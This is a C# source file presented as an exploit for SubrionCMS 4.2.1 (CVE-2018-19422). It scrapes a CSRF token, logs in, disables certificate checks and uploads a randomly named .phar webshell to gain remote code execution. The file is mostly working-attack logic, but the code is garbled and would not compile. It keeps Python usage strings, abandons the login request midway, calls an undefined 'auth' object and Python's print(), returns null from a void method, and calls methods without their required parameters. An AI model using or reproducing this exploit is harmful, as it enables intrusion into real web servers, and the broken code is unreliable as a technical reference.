using System;
using System.IO;
using System.Net;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Collections.Specialized;

namespace Exploit
{
    class Program
    {
        static string url_login;
        static string url_upload;
        static string url_shell;
        static string username;
        static string password;
        static string csrfToken;
        static string shell_name;

        static void Main(string[] args)
        {
            var options = new OptionSet {
                { "u|url=", "Base target uri http://target/panel", v => url_login = v },
                { "l|user=", "User credential to login", v => username = v },
                { "p|passw=", "Password credential to login", v => password = v }
            };

            try {
                options.Parse(args);
            } catch (OptionException e) {
                Console.Write("exploit.py: ");
                Console.WriteLine(e.Message);
                Console.WriteLine("Try `exploit.py -h' for more information.");
                return;
            }

            if (string.IsNullOrEmpty(url_login)) {
                Console.WriteLine("[+] Specify an url target");
                Console.WriteLine("[+] Example usage: exploit.py -u http://target-uri/panel");
                Console.WriteLine("[+] Example help usage: exploit.py -h");
                return;
            }

            url_upload = url_login + "uploads/read.json";
            url_shell = url_login + "uploads/";

            Login();

            NameRnd();

            ShellUpload();

            Console.ReadLine();
        }

        static void Login()
        {
            Console.WriteLine("[+] SubrionCMS 4.2.1 - File Upload Bypass to RCE - CVE-2018-19422 \n");
            Console.WriteLine("[+] Trying to connect to: " + url_login);

            try {
                ServicePointManager.ServerCertificateValidationCallback = new RemoteCertificateValidationCallback(ValidateServerCertificate);
                var get_token_request = (HttpWebRequest)WebRequest.Create(url_login);
                var response = (HttpWebResponse)get_token_request.GetResponse();
                var responseString = new StreamReader(response.GetResponseStream()).ReadToEnd();
                var soup = new HtmlAgilityPack.HtmlDocument();
                soup.LoadHtml(responseString);
                csrfToken = soup.DocumentNode.SelectSingleNode("//input[@name='__st']").Attributes["value"].Value;
                Console.WriteLine("[+] Success!");
                System.Threading.Thread.Sleep(1000);

                if (!string.IsNullOrEmpty(csrfToken)) {
                    Console.WriteLine($"[+] Got CSRF token: {csrfToken}");
                    Console.WriteLine("[+] Trying to log in...");

                    var auth_url = url_login;
                    var auth_cookies = new CookieCollection { new Cookie("loader", "loaded") };
                    var auth_headers = new WebHeaderCollection();
                    auth_headers.Add("User-Agent", "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0");
                    auth_headers.Add("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8");
                    auth_headers.Add("Accept-Language", "pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3");
                    auth_headers.Add("Accept-Encoding", "gzip, deflate");
                    auth_headers.Add("Content-Type", "application/x-www-form-urlencoded");
                    auth_headers.Add("Origin", "http://192.168.1.20");
                    auth_headers.Add("Connection", "close");
                    auth_headers.Add("Referer", "http://192.168.1.20/panel/");
                            auth_headers.Add("Upgrade-Insecure-Requests", "1");
        auth.Headers = auth_headers;

        print("[+] Logged in as: " + username);

    }
    catch (Exception ex)
    {
        Console.WriteLine("[x] An error occurred while logging in: " + ex.Message);
        return null;
    }
}

static string NameRnd()
{
    string shell_name;
    Console.WriteLine("[+] Generating random name for Webshell...");
    shell_name = new string(Enumerable.Repeat("abcdefghijklmnopqrstuvwxyz", 15)
        .Select(s => s[random.Next(s.Length)]).ToArray());
    Thread.Sleep(1000);
    Console.WriteLine("[+] Generated webshell name: " + shell_name + "\n");
    return shell_name;
}

static void ShellUpload(string url_upload, string csrfToken, string shell_name)
{
    Console.WriteLine("[+] Trying to Upload Webshell..");
    try
    {
        using (var client = new HttpClient())
        using (var content = new MultipartFormDataContent("---------------------------6159367931540763043609390275"))
        {
            client.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0");
            client.DefaultRequestHeaders.Add("Accept", "*/*");
            client.DefaultRequestHeaders.Add("Accept-Language", "pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3");
            client.DefaultRequestHeaders.Add("Accept-Encoding", "gzip, deflate");
            client.DefaultRequestHeaders.Add("Origin", "http://192.168.1.20");
            client.DefaultRequestHeaders.Add("Referer", "http://192.168.1.20/panel/uploads/");
            client.DefaultRequestHeaders.Add("Connection", "close");
            client.DefaultRequestHeaders.Add("Cookie", "INTELLI_06c8042c3d=15ajqmku31n5e893djc8k8g7a0; loader=loaded");
            content.Add(new StringContent("17978446266285"), "reqid");
            content.Add(new StringContent("upload"), "cmd");
            content.Add(new StringContent("l1_Lw"), "target");
            content.Add(new StringContent(csrfToken), "__st");
            content.Add(new ByteArrayContent(File.ReadAllBytes(shell_name + ".phar")), "upload[]", shell_name + ".phar");
            var response = client.PostAsync(url_upload, content).Result;
            if (response.StatusCode != HttpStatusCode.OK)
            {
                Console.WriteLine("[x] Webshell upload failed. Status code: " + response.StatusCode);
                return;
            }
            Console.WriteLine("[+] Webshell uploaded successfully!");
        }
    }
    catch (Exception ex)
    {
        Console.WriteLine("[x] An error occurred while uploading the webshell: " + ex.Message);
        return;
    }
}

